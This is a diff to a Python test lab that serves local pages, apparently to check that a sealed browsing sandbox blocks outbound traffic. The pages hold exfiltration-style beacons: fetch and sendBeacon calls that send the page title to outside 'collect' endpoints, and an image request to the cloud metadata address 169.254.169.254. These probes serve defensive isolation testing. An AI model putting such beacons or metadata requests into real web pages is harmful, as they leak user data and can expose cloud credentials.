@@ -142,6 +142,14 @@ class Lab:
             body = ('<h1>Offre spéciale</h1><img alt="pixel" src="http://169.254.169.254/latest/meta-data/">'
                     '<script>fetch("http://10.0.0.1/collect?d=" + document.title).catch(() => {});</script>')
             return self._send(handler, self._page("Offre", body))
+        if path == "/sortie":
+            # Page locale qui tente explicitement de joindre des domaines publics (image, fetch,
+            # balise) : le laboratoire étant hermétique, rien ne doit sortir.
+            body = ('<h1>Partenaires</h1><img alt="logo" src="https://www.gstatic.com/images/branding/logo.png">'
+                    '<script>fetch("https://www.google.com/collect?d=" + encodeURIComponent(document.title))'
+                    '.catch(() => {}); navigator.sendBeacon && navigator.sendBeacon("http://example.com/beacon", '
+                    '"devis");</script>')
+            return self._send(handler, self._page("Partenaires", body))
         if path in {"/documentation", "/tarifs", "/aide"}:
             return self._send(handler, self._page("Informations", "<h1>Informations</h1><p>Page informative "
                                                   "sans formulaire. Revenez à l'accueil pour une demande.</p>"))
